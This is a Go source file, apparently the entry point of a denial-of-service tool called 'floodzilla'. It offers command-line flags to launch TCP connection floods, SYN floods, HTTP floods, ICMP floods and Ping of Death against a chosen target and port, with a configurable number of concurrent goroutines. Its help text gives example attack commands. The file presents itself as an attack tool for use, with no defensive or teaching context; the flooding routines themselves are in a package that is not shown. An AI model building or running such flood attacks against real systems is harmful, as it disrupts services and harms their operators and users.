package main

import (
	"flag"
	"floodzilla/services"
	"fmt"
)

func main() {
	tcpFlood := flag.Bool("tcp-flood", false, "Execute TCP Connection Flood\nExample: ./floodzilla -tcp-flood -target 192.168.0.1 -port 80 -verbose")
	synFlood := flag.Bool("syn-flood", false, "Execute SYN Flood\nExample: ./floodzilla -syn-flood -target 192.168.0.1 -port 80 -verbose")
	httpFlood := flag.Bool("http-flood", false, "Execute HTTP Flood\nExample: ./floodzilla -http-flood -target http://192.168.0.1 -verbose")
	icmpFlood := flag.Bool("icmp-flood", false, "Execute ICMP Flood\nExample: ./floodzilla -icmp-flood -target 192.168.0.1 -verbose")
	pingOfDeath := flag.Bool("ping-death", false, "Execute Ping of Death\nExample: ./floodzilla -ping-death -target 192.168.0.1 -verbose")
	verbose := flag.Bool("verbose", false, "Verbose Mode: Show the details about each request")
	target := flag.String("target", "", "Target Address")
	port := flag.Int("port", 80, "Target Port")
	numRoutines := flag.Int("n", 10, "Number of goroutine executing simultaneously")
	flag.Parse()

	if *tcpFlood {
		services.TcpConnectionFlood(target, port, numRoutines, verbose)
	} else if *synFlood {
		services.SynFlood(target, port, numRoutines, verbose)
	} else if *httpFlood {
		services.HttpFlood(target, numRoutines, verbose)
	} else if *icmpFlood {
		services.IcmpFlood(target, numRoutines, verbose)
	} else if *pingOfDeath {
		services.PingOfDeath(target, numRoutines, verbose)
	} else {
		fmt.Println("Choose a valid attack.")
		flag.Usage()
	}
}
